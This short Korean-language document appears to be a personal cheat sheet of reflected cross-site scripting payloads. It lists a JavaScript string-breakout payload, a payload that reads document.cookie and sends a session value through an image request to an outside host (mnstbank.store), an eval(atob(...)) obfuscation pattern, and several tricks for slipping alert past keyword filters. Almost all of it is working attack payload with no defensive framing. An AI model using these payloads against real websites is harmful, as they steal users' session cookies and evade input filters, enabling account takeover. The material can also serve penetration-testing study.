[POST Reflected XSS]


[GET Reflected XSS]
# 자바스크립트 내 동작
1. ';alert(document.cookie);var a='
** ';var+s=document.cookie.split(';')[2].trim();var+url='https://www.mnstbank.store/session?s='%2Bs;new+Image().src=url;var+a='

2. eval(atob("base64값"))

3. alert 문자 우회
- eval('ale'+'rt(0)');
- Function("ale"+"rt(1)")();
- new Function`al\ert\`6\``;